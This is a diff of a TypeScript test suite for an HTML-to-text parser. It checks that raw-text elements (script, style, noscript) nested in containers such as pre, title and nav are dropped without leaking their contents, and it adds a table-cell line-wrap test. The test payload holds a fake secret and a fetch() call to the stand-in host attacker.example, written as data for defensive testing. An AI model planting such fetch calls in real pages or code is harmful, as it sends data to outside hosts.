@@ -600,41 +600,33 @@ describe("htmlParser — post-merge audit fixes (#1886)", () => {
 // the skip and leaking the remainder of the still-open <script> body as ordinary text.
 describe("htmlParser — nested-script leak hardening across skip paths (audit 2026-07-07)", () => {
   const secret = "PRE-LEAKED-SECRET-ABC";
-  function nestedScriptPayload(closingTag: string): string {
+  const rawTextTags = ["script", "style", "noscript"] as const;
+  const containerTags = ["pre", "title", "nav", "footer", "aside"] as const;
+
+  function rawTextPayload(rawTextTag: (typeof rawTextTags)[number], closingTag: string): string {
     return (
-      `<script>var s="</${closingTag}>";var secret="${secret}";` +
-      'fetch("http://attacker.example/y");</script>'
+      `<${rawTextTag}>var s="</${closingTag}>";var secret="${secret}";` +
+      `fetch("http://attacker.example/y");</${rawTextTag}>`
     );
   }
 
-  it("drops a <script> nested in <pre> even when its body contains a literal </pre> substring", () => {
-    const html = `<pre>code${nestedScriptPayload("pre")}tail</pre><p>After.</p>`;
-    const { text } = parseHtml(html);
-    expect(text).not.toContain(secret);
-    expect(text).not.toContain("attacker.example");
-    expect(text).not.toContain("<script");
-    expect(text).toContain("After.");
-  });
-
-  it("drops a <script> nested in <title> even when its body contains a literal </title> substring", () => {
-    const html =
-      `<html><head><title>Doc${nestedScriptPayload("title")}Tail</title></head>` +
-      "<body><p>Body.</p></body></html>";
-    const { text } = parseHtml(html);
-    expect(text).not.toContain(secret);
-    expect(text).not.toContain("attacker.example");
-    expect(text).not.toContain("<script");
-    expect(text).toContain("Body.");
-  });
-
-  it.each(["nav", "footer", "aside"] as const)(
-    "drops a <script> nested in <%s> even when its body contains the container's own literal closing-tag substring",
-    (tagName) => {
-      const html = `<${tagName}>boiler${nestedScriptPayload(tagName)}tail</${tagName}><p>Main.</p>`;
+  it.each(
+    rawTextTags.flatMap((rawTextTag) =>
+      containerTags.map((containerTag) => ({ rawTextTag, containerTag })),
+    ),
+  )(
+    "drops a <$rawTextTag> nested in <$containerTag> when its body contains the container close tag",
+    ({ rawTextTag, containerTag }) => {
+      const html =
+        containerTag === "title"
+          ? `<html><head><title>Doc${rawTextPayload(rawTextTag, containerTag)}Tail</title></head>` +
+            "<body><p>Main.</p></body></html>"
+          : `<${containerTag}>body${rawTextPayload(rawTextTag, containerTag)}tail</${containerTag}>` +
+            "<p>Main.</p>";
       const { text } = parseHtml(html);
       expect(text).not.toContain(secret);
       expect(text).not.toContain("attacker.example");
-      expect(text).not.toContain("<script");
+      expect(text).not.toContain(`<${rawTextTag}`);
       expect(text).toContain("Main.");
     },
   );
@@ -664,5 +656,13 @@ describe("htmlParser — table span hardening (audit 2026-07-07)", () => {
       buildParserOptions({ now: () => 0 }),
     );
     expect(result.diagnostics.map((d) => d.code)).toContain("HTML_TABLE_SPAN_UNSUPPORTED");
+  });
+
+  it("collapses source line-wraps inside table cells before emitting row text", () => {
+    const html =
+      "<table><tr><th>Name</th><th>Description</th></tr>" +
+      "<tr><td>Alpha</td><td>first\n        wrapped\n        value</td></tr></table>";
+    const row = blockTexts(html).find((text) => text.startsWith("Table:"));
+    expect(row).toBe("Table: Name=Alpha | Description=first wrapped value");
   });
 });
